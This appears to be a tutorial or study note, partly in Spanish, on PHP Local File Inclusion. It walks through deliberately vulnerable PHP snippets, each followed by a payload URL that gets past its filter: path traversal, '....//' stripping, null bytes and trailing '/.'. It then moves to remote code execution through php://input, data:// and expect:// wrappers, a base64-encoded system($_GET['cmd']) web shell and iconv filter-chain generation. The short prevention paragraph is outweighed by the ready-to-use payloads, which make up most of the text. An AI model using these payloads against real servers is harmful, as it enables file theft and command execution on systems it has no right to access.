The Local File Inclusion (LFI) vulnerability is a computer security vulnerability that occurs when a web application fails to properly validate user input, allowing an attacker to access local files on the web server.

In many cases, attackers exploit the LFI vulnerability by abusing input parameters in the web application. Input parameters are data that users enter into the web application, such as URLs or form fields. Attackers can manipulate the input parameters to include local file paths in the request, which can allow them to access files on the web server. This technique is known as "Path Traversal" and is commonly used in LFI attacks.

In the Path Traversal attack, the attacker uses special characters and escape characters in the input parameters to navigate through web server directories and access files in sensitive locations on the system.

For example, the attacker could include "../" in the input parameter to navigate up the directory structure and access files in sensitive system locations.

To prevent LFI attacks, it is important for web application developers to properly validate and filter user input, limiting access to system resources and ensuring that files can only be included from allowed locations. In addition, companies should implement appropriate security measures, such as file encryption and limiting unauthorized user access to system resources.

# Example

We can do a basic LFI attack where we will read the */etc/passwd* file:

```php
<?php
    $filename = $_GET['filename'];
    include($filename); // 'include' keyword opens a file
?>
```

```
http://localhost/index.php?filename=/etc/passwd
```

In this case the victim is trying to protect itself by limiting the directory from which we can call the file:

```php
<?php
    $filename = $_GET['filename'];
    include("/var/www/html/" . $filename); // /var/www/html//etc/passwd /var/www/html/../../../../../../etc/passwd (directory path traversal, tirar hacia la raiz para ejecutar el dichero)
?>
```

We can bypass it doing a **Path Traversal** by navigating to the root and then to the directory and file we want:

```
http://localhost/index.php?filename=../../../../../../../etc/passwd
```

In this case the victim tries to remove the '../' so that we cannot do a **Path Traversal**:

```php
<?php
    $filename = $_GET['filename'];
    $filename = str_replace("../", "", $filename);
    
    include("/var/www/html/" . $filename);
?>
```

If it is not recursive, we can bypass this as follows:

```
http://localhost/index.php?filename=....//....//....//....//....//....//....//etc/passwd
```

In this way, even if the substitution removes the '../' we will still be left with a '../'.

In this case the victim tries to protect itself by using regular expressions to prevent access to '/etc/passwd':

```php
<?php
    $filename = $_GET['filename'];
    $filename = str_replace("../", "", $filename);
    
    if(preg_match("\/etc\/passwd/", $filename) === 1) {
        echo "\n[!] No es posible visualizar el contenido de este archivo\n";
    } else {
        include("/var/www/html/" . $filename);
    }
?>
```

We can bypass this as follows:

```
http://localhost/index.php?filename=....//....//....//....//....//....//....//etc///////////passwd

http://localhost/index.php?filename=....//....//....//....//....//....//....//etc/././././passwd
```

Here the user tries to delimit by extension the files that can be added:

```php
<?php
    $filename = $_GET['filename'];
    $filename = str_replace("../", "", $filename);
    
    include("/var/www/html/" . $filename . ".php");
?>
```

In *older versions of PHP* you can insert a nullbyte "%00" to bypass file extensions (**Null Byte Injection**):

```
http://localhost/index.php?filename=....//....//....//....//....//....//....//etc/passwd%00

http://localhost/index.php?filename=....//....//....//....//....//....//....//etc/passwd\0
```

Also in *older versions of PHP*, in case of filters like 'make sure that the last 6 characters of the input is not passwd':

```php
<?php
    $filename = $_GET['filename'];
    $filename = str_replace("../", "", $filename);
    
    if(substr($filename, -6, 6) != "passwd") {
        include($filename);
    }
?>
```

We can bypass it like this:

```
http://localhost/index.php?filename=....//....//....//....//....//....//....//etc/passwd/.
```

Also in *older versions of PHP*, in case of filters like 'I want the file to end with the extension .txt':

```php
<?php
    $filename = $_GET['filename'];
    $filename = str_replace("../", "", $filename);
    
    if(substr($filename, -4, 4) != ".txt") { // Esto hace alusion a los ultimos 4 caracteres de la cadena de texto
        include($filename);
    }
?>
```

It would also be bypassed as in the previous case:

```
http://localhost/index.php?filename=....//....//....//....//....//....//....//etc/passwd/.
```

## Wrappers

We can use the wrapper *php://filter* to represent the same data contained in the file as *base64*, among others

```
http://localhost/index.php?filename=php://filter/convert.base64-encode/resource=/etc/passwd
```

The resulting *base64* string can be saved in a file (in this case we will call it 'myFile') and converted to plain text in this way:

```shell
# The 'sponge' command is used to put the result in the same file
cat data | base64 -d | sponge data
```

We can use the following wrapper to rotate each character 13 positions:

```
php://filter/read=string.rot13/resource=/etc/passwd
```

We can perhaps execute commands at the system level with the following wrapper:

```
expect://whoami
```

If we change the request from *GET* to *POST* method we could pass data to it with this wrapper and start an RCE:

```
POST /?filename=php://input
```

And we can send as data the command we want:

```php
<?php system("whoami"); ?>
```

If we change the petition as *GET* again we can obtain *RCE* too:

```php
// We convert the command into base64
echo '<?php system("whoami"); ?>' | base64; echo

// We use the base64 command here
data://text/plain;base64,{CODE_IN_BASE}

// We can also handle it with 'cmd'
echo '<?php system($_GET["cmd"]); ?>' | base64; echo
data://text/plain;base64,{CODE_IN_BASE}&cmd=whoami
```

### Filter Chains

We have to keep in mind that PHP needs to convert the data from UTF8 to UTF7 so that the '=' does not cause conflict and error:

```bash
# UTF8.UTF7 is used to convert from UTF8 to UTF7
php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/tmp/test');"; echo
```

----
> If you don't know which file to point to on a machine, point to *php://temp*
----

To achieve the desired effect and to be able to execute an *RCE* we must introduce characters to the left of the base64 string playing with the encode and decode, manually:

```php
// In this case we are introducing 'Hola'
php://filter/convert.iconv.UTF8. CSIS02022KR | convert.iconv.UTF8.UTF7 | convert.iconv.CP1046.UTF32 | convert.iconv.L6.UCS-2 | convert.ic onv.UTF-16LE.T.61-8BIT | convert.iconv.865.UCS-4LE | convert.base64-decode | convert.base64-encode | convert.iconv.UTF8.UTF7 | convert. iconv.CP-AR.UTF16 | convert.iconv.8859_4.BIG5HKSCS | convert.ic onv.MSCP1361.UTF-32LE | convert.iconv.IBM932.UCS-2BE | convert.base64-decode | convert.base64-encode | convert.iconv.UTF8.UTF7 | convert.iconv.JS. UNICODE | convert.iconv.L4.UCS2 | convert.iconv.UCS- 4LE.OSF05010001 | convert.iconv. IBM912.UTF-16LE | convert.base64-decode | convert.base64-encode | convert.iconv.UTF8.UTF7 | convert.iconv.CP1046.UTF16 | convert.iconv. IS06937. SHIFT_JISX0213 | conver t.base64-decode | convert.base64-encode | convert.iconv.UTF8.UTF7/resource=php://temp
```

We can also do this automatically with the [php_filter_chain_generator]("https://github.com/synacktiv/php_filter_chain_generator") tool:

```bash
python3 php_filter_chain_generator.py --chain 'Hola'

python3 php_filter_chain_generator.py --chain '<?php system("whoami"); ?>'

python3 php_filter_chain_generator.py --chain '<?php system($_GET['cmd']); ?>'
```

If the web interprets php on the back end, it is worth trying all these wrappers.

----
> Be careful with spaces in the .php file! Delete all spaces manually and then tabulate in case you get a 500 error on our server.
----